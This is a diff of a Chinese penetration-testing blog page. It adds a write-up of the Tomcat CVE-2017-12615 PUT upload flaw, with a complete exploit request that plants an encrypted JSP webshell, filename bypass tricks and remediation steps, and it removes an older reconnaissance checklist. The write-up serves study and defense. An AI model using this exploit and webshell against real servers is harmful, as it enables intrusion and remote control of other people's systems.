@@ -200,6 +200,94 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="xiaoluan">
+      <meta itemprop="description" content="健康 规律 技能">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="小乱的Blog">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2022/06/27/Tomcat-CVE-2017-12615-PUT%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/" class="post-title-link" itemprop="url">Tomcat:CVE-2017-12615-PUT上传漏洞</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-06-27 21:53:40" itemprop="dateCreated datePublished" datetime="2022-06-27T21:53:40+08:00">2022-06-27</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-07-16 22:52:36" itemprop="dateModified" datetime="2022-07-16T22:52:36+08:00">2022-07-16</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">1.外围渗透</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/source/categories/1-%E5%A4%96%E5%9B%B4%E6%B8%97%E9%80%8F/3-%E5%B7%B2%E7%9F%A5%E6%BC%8F%E6%B4%9E/" itemprop="url" rel="index"><span itemprop="name">3.已知漏洞</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p><a target="_blank" rel="noopener" href="https://vulfocus.cn/#/dashboard">https://vulfocus.cn/#/dashboard</a></p>
+<h3 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h3><p>Tomcat7.0.0-7.0.81</p>
+<p>Tomecat允许put方法</p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>当conf&#x2F;web.xml中的readonly设置为false时，可导致PUT方法上传任意文件。</p>
+<p>改POST为PUT，文件名为&#x2F;shell.jsp&#x2F;，jsp后面带斜杠可以绕过tomcat默认拦截jsp文件上传的规则，数据包如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PUT /shell.jsp/ HTTP/1.1</span><br><span class="line">Host: 123.58.236.76:62569</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: Hm_lvt_deaeca6802357287fb453f342ce28dda=1650783599,1650802097,1652247719,1652272906; JSESSIONID=CF2E094DF0D9B8D77D0CFA3B123093A6</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 533</span><br><span class="line"></span><br><span class="line">&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if (request.getMethod().equals(&quot;POST&quot;))&#123;String k=&quot;xxxxxxxxxxxxx&quot;;session.putValue(&quot;u&quot;,k);Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p>上传后访问&#x2F;shell.jsp，用冰蝎连接木马getshell。</p>
+<h3 id="注"><a href="#注" class="headerlink" title="注"></a>注</h3><p>必须当conf&#x2F;web.xml中的readonly设置为false时，才会导致该漏洞。</p>
+<p>上传文件名为shell.jsp&#x2F;是绕过文件名后缀后名单的一种方式，还可以采取其他方式，linux中shell.jsp&#x2F;，windows中shell.jsp.|shell.jsp::$DATA|shell.jsp%20等都可以</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1.配置readonly和VirtualDirContext值为True或注释参数，禁止使用PUT方法并重启<br> tomcat<br> 注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。<br> 2.根据官方补丁升级最新版本</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/06/20/go%E8%AF%AD%E8%A8%80%E6%89%93%E5%8C%85/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1060,130 +1148,10 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.png">
-      <meta itemprop="name" content="xiaoluan">
-      <meta itemprop="description" content="健康 规律 技能">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="小乱的Blog">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/04/13/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E6%80%9D%E8%B7%AF/" class="post-title-link" itemprop="url">信息收集思路</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2022-04-13 19:10:52" itemprop="dateCreated datePublished" datetime="2022-04-13T19:10:52+08:00">2022-04-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2022-07-16 22:52:37" itemprop="dateModified" datetime="2022-07-16T22:52:37+08:00">2022-07-16</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/source/categories/1-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url" rel="index"><span itemprop="name">1.信息收集</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>【组织架构】</p>
-<p>【主域名】</p>
-<p>–备案反查顶级域名（<a target="_blank" rel="noopener" href="http://icp.chinaz.com)/">http://icp.chinaz.com）</a></p>
-<p>–ip反查域名</p>
-<p>–组织架构，子公司信息收集</p>
-<p>【子域名】</p>
-<p>–子域名爆破（非泛解析域名；收集subfinder、Sbulist3r、OneForAll、子域名挖掘机、ksubdomain的字典）</p>
-<p>–子域名查询（theHarvester、virustotal、ce.baidu.com、url.fht.im……水泽……，集成水泽的所有功能，并写一个接口测试模块，信息收集开始前，显示有效接口列表；信息收集结束后，如果有未正常结束的，产生告警。并对所有接口模块化编程，使用户在知道哪个接口异常后，可以轻松找到对应接口的脚本文件，纠错，并使用该单一脚本文件补全结果。）</p>
-<p>–IP反查域名</p>
-<p>–友链爬虫</p>
-<p>‘’‘算法：后爬到的域名越靠前，证明它越难被收集到，越有可能测到漏洞’‘’</p>
-<p>‘’‘算法：多列表切割结果，实时存放结果，如一个列表存放10000个子域名，10000满后就将列表中的值全部保存到文件1中，依次类推，直到结束后，从编号最大的一个文件开始倒序读取子域名，存入同一文件当中，这样最后收集到的子域名就变成了最终子域名列表的第一个’‘’</p>
-<p>【IP:端口】</p>
-<p>–子域名解析</p>
-<p>–nmap</p>
-<ul>
-<li>收集IP列表及其端口开放情况，批量对某些可以公开登录的服务进行弱密码爆破</li>
-</ul>
-<p>【github信息收集】</p>
-<p>–水泽</p>
-<ul>
-<li>zeebe密钥泄露</li>
-<li>各类服务、主机用户名密码泄露</li>
-<li>源代码泄露</li>
-<li>Sql代码泄露</li>
-</ul>
-<p>【存活URL验证】</p>
-<p>–http&#x2F;https双验证</p>
-<p>–vpn二次验证（双验证不存活，则挂三个不同vpn二次验证，还不存活则认定不存活）</p>
-<p>【存活URL版本特征检索】</p>
-<p>–目录爬虫（根据某些cms的特殊目录名，如swagger-ui、zentao、seeyon等来确定）</p>
-<p>–响应头检索（根据Server、x-forwared-for等响应头泄露的信息来判断）</p>
-<p>–报错信息判断（根据nginx、apache、thinkphp等的特征报错信息来判断；可以使用奇怪文件名、目录回溯、错误参数等方法来引发报错）</p>
-<p>【微信】</p>
-<p>【APP】</p>
-<p>【小程序】</p>
-<p>【网盘】</p>
-<p>【邮箱】</p>
-<p>【社工库】</p>
-<p>【特殊后台检索】</p>
-<p>–管理员后台</p>
-<p>–用户后台</p>
-<p>–邮箱地址</p>
-<p>–vpn地址</p>
-<p>–安全设备管理后台</p>
-<p>–网络设备管理后台</p>
-<p>–及其他</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="page-number" href="/page/5/">5</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1251,14 +1219,14 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">50</span>
+          <span class="site-state-item-count">51</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">30</span>
+        <span class="site-state-item-count">31</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
   </nav>
@@ -1295,7 +1263,7 @@
   </div>
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共32.2k字</span>
+  <span class="post-count">博客全站共32.4k字</span>
 </div>
 
     <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
